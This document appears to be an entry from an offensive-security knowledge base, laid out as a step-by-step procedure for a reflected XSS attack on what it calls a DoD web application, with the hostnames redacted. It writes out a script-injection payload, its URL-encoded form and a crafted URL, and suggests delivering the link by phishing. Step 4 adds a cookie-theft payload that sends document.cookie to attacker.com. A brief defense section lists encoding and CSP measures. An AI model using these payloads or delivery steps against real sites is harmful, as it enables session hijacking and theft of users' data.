---
id: proc-inject-js-payload-xss
tags:
  - xss
  - reflected-xss
  - javascript-injection
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.395Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-Payload-for-Reflected-XSS

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in a web application by injecting a malicious JavaScript payload into a URL parameter. The payload is reflected back unsanitized in the page, executing in the context of the victim's browser. Primary use case is testing for XSS in public-facing web apps to demonstrate risks like session hijacking or data theft.

## Description

In a reflected XSS attack, user-supplied input from a URL query parameter is directly echoed back into the HTML response without proper encoding or sanitization. By injecting a script tag with JavaScript code, an attacker can force the victim's browser to execute the code when the malicious URL is accessed (e.g., via phishing). This procedure targets a DoD web application where the redacted parameter is vulnerable. Expected outcomes include arbitrary JS execution, such as displaying an alert or stealing cookies. Prerequisites include access to a web browser and knowledge of the vulnerable URL structure.

## Requirements

1. Access to the target web application URL (public-facing, no authentication needed)
2. Web browser (e.g., Chrome, Firefox) for payload testing and verification
3. Basic understanding of URL encoding to craft payloads

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all user inputs reflected in pages
- Use Content Security Policy (CSP) headers to restrict inline script execution
- Validate and sanitize URL parameters server-side using libraries like OWASP ESAPI
- Monitor for anomalous JavaScript payloads in access logs

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser context
2. Demonstrate potential for stealing session tokens or sensitive data
3. Validate the vulnerability for reporting or remediation

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: Determine the URL parameter that reflects user input directly into the page without sanitization. In this case, the redacted parameter in the DoD application is vulnerable.

Inspect the target page source or use developer tools to confirm reflection points. No specific command is needed; manually review the URL structure like `https://█████/████████?████████=INPUT&██████████`.

> Expected: Input value appears in HTML without encoding, e.g., as an attribute value.

### Step 2: Craft and URL-Encode the Payload

**Context**: Create a JavaScript payload that breaks out of the context (e.g., HTML attribute) and injects a script tag. Use a simple alert for testing.

Payload: `"><script>alert(/frenchvlad/);</script>`

URL-encode it: `%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E`

> This escapes the attribute and injects executable JS. Expected: Encoded string ready for URL append.

### Step 3: Inject Payload and Access URL

**Context**: Append the encoded payload to the vulnerable parameter and access the URL in a browser.

Construct: `https://█████/████████?████████=%22%3E%3Cscript%3Ealert(/frenchvlad/);%3C/script%3E&██████████`

Access the URL directly or send via phishing.

> Expected: Page loads with JavaScript execution, e.g., alert box appears.

### Step 4: Verify Execution

**Context**: Confirm the payload executed by checking for the alert or inspecting page source for the reflected script.

Use browser console to check for errors or executed code. Test further payloads for data exfiltration, e.g., `"><script>document.location='http://attacker.com?cookie='+document.cookie;</script>`.

> Expected: No CSP blocks; successful alert or network request to attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[JavaScript]]
